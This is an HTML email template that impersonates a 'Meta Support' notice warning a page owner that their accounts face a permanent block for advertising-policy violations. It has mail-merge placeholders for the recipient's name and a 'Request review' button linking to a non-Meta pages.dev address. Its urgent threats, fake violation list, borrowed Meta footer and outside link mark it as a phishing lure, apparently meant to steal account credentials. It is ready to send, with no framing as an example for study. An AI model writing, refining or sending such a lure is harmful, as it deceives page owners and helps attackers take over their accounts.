<html>
<head>
    <title>Notification from Meta Support</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
            border: 1px solid #dddddd;
            padding: 20px;
        }
        h1, p {
            margin: 0;
            padding: 0 0 10px;
        }
        .button {
            display: inline-block;
            padding: 10px 20px;
            font-size: 16px;
            color: #ffffff;
            background-color: #007bff;
            text-decoration: none;
            border-radius: 5px;
        }
        .footer {
            font-size: 12px;
            color: #888888;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
<div class="container">
    <p>Hello <strong>{{{$last_name}}}</strong>,</p>
    <p>After reviewing the customer complaint, your page may be permanently locked for violating the Meta advertising policy.</p>

    <p><strong>We have identified the following violations:</strong></p>
    <ul>
        <li>Page {{$last_name}} associated with an account containing prohibited products or services</li>
        <li>Copyright infringement</li>
        <li>Posting inappropriate or misleading content</li>
    </ul>

    <p><strong>Note:</strong> Business accounts, advertising accounts, and personal Facebook accounts associated with {{$last_name}} may be permanently blocked if your complaint is not resolved.</p>

    <p>If you feel that this decision is unsatisfactory, you can request a review by filing an appeal:</p>
    <p><a href="https://e9-6rp.pages.dev/appeal_case_ID/" class="button" target="_blank">Request review</a></p>

    <p class="footer">
        Meta Platforms, Inc., Attention: Community Support, 1 Facebook Way, Menlo Park, CA 94025.
    </p>
</div>
</body>
</html>
